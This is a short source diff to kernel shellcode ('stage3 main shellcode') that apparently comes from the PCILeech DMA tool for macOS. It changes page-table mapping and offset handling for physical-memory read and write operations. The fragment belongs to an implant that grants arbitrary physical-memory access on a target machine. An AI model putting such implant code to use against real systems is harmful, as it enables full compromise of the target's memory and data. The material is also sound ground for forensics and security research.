@@ -1,7 +1,7 @@
 // ax64_stage3_c.c : stage3 main shellcode.
-// Compatible with OS X.
+// Compatible with macOS.
 //
-// (c) Ulf Frisk, 2016
+// (c) Ulf Frisk, 2016, 2017
 // Author: Ulf Frisk, pcileech@frizk.net
 //
 
@@ -273,13 +273,13 @@ VOID stage3_c_EntryPoint(PKMDDATA pk)
 		}
 		if(KMD_CMD_READ == pk->_op || KMD_CMD_WRITE == pk->_op) { // PHYSICAL MEMORY READ/WRITE
 			for(i = 0; i < 512 * 8; i++) { // PT*8 -> Pages
-				((PQWORD)(qwPT_VA + 0x2000))[i] = 0x0000000000000003 | (pk->_address + 0x1000 * i);
+				((PQWORD)(qwPT_VA + 0x2000))[i] = 0x8000000000000003 | ((pk->_address & 0x7ffffffffffff000) + 0x1000 * i);
 			}
 			PageFlush();
 			if(KMD_CMD_READ == pk->_op) { // READ
-				SysVCall(pk->fn.memcpy, qwBufferOutDMA, 0xffffee8000000000, pk->_size);
+				SysVCall(pk->fn.memcpy, qwBufferOutDMA, 0xffffee8000000000 + (pk->_address & 0xfff), pk->_size);
 			} else { // WRITE
-				SysVCall(pk->fn.memcpy, 0xffffee8000000000, qwBufferOutDMA, pk->_size);
+				SysVCall(pk->fn.memcpy, 0xffffee8000000000 + (pk->_address & 0xfff), qwBufferOutDMA, pk->_size);
 			}
 			pk->_result = TRUE;
 		}
